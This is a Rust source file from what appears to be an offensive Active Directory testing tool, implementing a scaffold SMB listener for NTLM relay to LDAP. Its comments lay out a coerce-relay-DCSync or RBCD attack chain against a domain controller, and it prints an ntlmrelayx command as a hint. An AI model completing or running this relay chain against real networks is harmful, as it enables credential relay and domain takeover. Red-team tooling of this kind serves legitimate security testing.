//! `attack relay-listen` — standalone SMB→LDAP NTLM relay listener.
//!
//! **1.5.2 scaffold.** Binds TCP 445 and accepts one incoming SMB2 session,
//! logging the raw NTLMSSP frames the coerced peer sends. The full relay flow
//! (extract NTLMSSP NEGOTIATE from the SMB session-setup, open a matching
//! LDAPS connection to `--relay-target`, forward NEGOTIATE to LDAP as the
//! first bind message, take LDAP's CHALLENGE and wrap it back into SMB2 as
//! the client's session-setup response, take the client's AUTHENTICATE and
//! forward it to LDAP for the second bind, then run whatever post-auth LDAP
//! modify chain the operator wants) is a ~500-LOC workstream that needs the
//! `smb2-client` sibling to grow SMB2-*server* primitives (currently the crate
//! is client-only). Same staging shape as F5 `lsa lsass-parse` and F4b (before
//! the full crypto pipeline landed): ship the CLI surface + a real socket
//! listener that DOES accept + log, so operators can rehearse the coerce
//! pipeline against an adhammer-listening port + the actual relay work
//! lands in the smb2-server workstream.
//!
//! Chain shape (once complete):
//! 1. Start this listener: `adhammer attack relay-listen --port 445 --relay-target ldaps://dc`
//! 2. In another terminal / process: `adhammer attack coerce --host <victim> --listener <listener-ip>`
//! 3. Coerced NTLMSSP arrives → relayed to LDAP → post-auth `write-rbcd` or `dcsync`.

use anyhow::{Context, Result};
use clap::Parser;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::time::timeout;

#[derive(Parser)]
pub(crate) struct RelayListenArgs {
    /// TCP port to bind (SMB is 445; use a high port like 4445 when running
    /// unprivileged or when 445 is already occupied by the host's own SMB).
    #[arg(long, default_value_t = 445)]
    pub port: u16,
    /// Address to bind (default `0.0.0.0` — all interfaces).
    #[arg(long, default_value = "0.0.0.0")]
    pub bind: String,
    /// URL of the LDAP(S) target to forward captured NTLMSSP frames into.
    /// **1.5.2**: recorded and echoed but the forward path is scaffolded —
    /// the smb2-server-primitives workstream lands it.
    #[arg(long, value_name = "URL")]
    pub relay_target: Option<String>,
    /// Cap how long the listener runs (seconds). 0 = run until Ctrl+C.
    /// Default: 60s — enough for one coerce round-trip.
    #[arg(long, default_value_t = 60)]
    pub duration: u64,
    /// Emit JSON envelope.
    #[arg(long)]
    pub json: bool,
}

pub(crate) async fn relay_listen(a: RelayListenArgs) -> Result<()> {
    let addr = format!("{}:{}", a.bind, a.port);
    let listener = TcpListener::bind(&addr)
        .await
        .with_context(|| format!("bind {addr}"))?;
    eprintln!(
        "[*] SMB relay listener on {addr} (target={})",
        a.relay_target.as_deref().unwrap_or("<none>")
    );

    let deadline = if a.duration == 0 {
        None
    } else {
        Some(tokio::time::Instant::now() + Duration::from_secs(a.duration))
    };
    let mut connections = 0usize;
    let mut bytes_captured = 0usize;

    loop {
        let accept_future = listener.accept();
        let accepted = match deadline {
            Some(d) => match timeout(
                d.saturating_duration_since(tokio::time::Instant::now()),
                accept_future,
            )
            .await
            {
                Ok(r) => r,
                Err(_) => break,
            },
            None => accept_future.await,
        };
        let (mut stream, peer) = match accepted {
            Ok(v) => v,
            Err(e) => {
                eprintln!("[!] accept error: {e}");
                break;
            }
        };
        connections += 1;
        eprintln!("[+] connection from {peer}");
        // Read the first inbound frame (SMB2 header + NetBIOS session header
        // if present). This is what a coerced peer sends first.
        let mut buf = [0u8; 4096];
        match timeout(Duration::from_secs(5), stream.read(&mut buf)).await {
            Ok(Ok(n)) if n > 0 => {
                bytes_captured += n;
                let hex_prefix = buf[..n.min(48)]
                    .iter()
                    .map(|b| format!("{b:02x}"))
                    .collect::<Vec<_>>()
                    .join(" ");
                let smb2_marker = buf.windows(4).any(|w| w == b"\xfeSMB");
                let ntlmssp_marker = buf.windows(8).any(|w| w == b"NTLMSSP\0");
                eprintln!("    ← {n} bytes  smb2={smb2_marker}  ntlmssp={ntlmssp_marker}");
                eprintln!("    hex[0..48]: {hex_prefix}");
                // Refuse the auth so the peer doesn't hang: send a plausible
                // SMB2 error response. This is scaffolding — real relay would
                // forward NEGOTIATE to the LDAP target here.
                let _ = stream
                    .write_all(&[
                        0x00, 0x00, 0x00, 0x00, // NBSS zero-length (close)
                    ])
                    .await;
                let _ = stream.shutdown().await;
            }
            _ => {
                eprintln!("    (no data / read timeout)");
            }
        }
        if a.duration == 0 && connections >= 1 {
            // One shot when no explicit duration.
            break;
        }
    }

    eprintln!(
        "[+] listener closed — {connections} connection(s) · {bytes_captured} bytes captured"
    );

    eprintln!(
        "[hint] this step is a known adhammer gap: the SMB→LDAP forward path \
         needs smb2-server primitives (currently smb2-client is client-only). \
         Ship as scaffold — coercion-listener rehearsal, not end-to-end relay."
    );
    eprintln!(
        "[hint] external tool: ntlmrelayx.py -t {t} -smb2support",
        t = a
            .relay_target
            .as_deref()
            .unwrap_or("ldaps://<dc.corp.local>")
    );
    eprintln!("[hint] see docs/GAPS.md#ntlm-relay-socks for the full row");

    if a.json {
        println!(
            "{{\"command\":\"adhammer attack relay-listen\",\"success\":true,\
             \"evidence\":{{\"bind\":{a:?},\"port\":{p},\"connections\":{c},\
             \"bytes_captured\":{b},\"status\":\"scaffold — forward path deferred\"}}}}",
            a = a.bind,
            p = a.port,
            c = connections,
            b = bytes_captured
        );
    }
    Ok(())
}
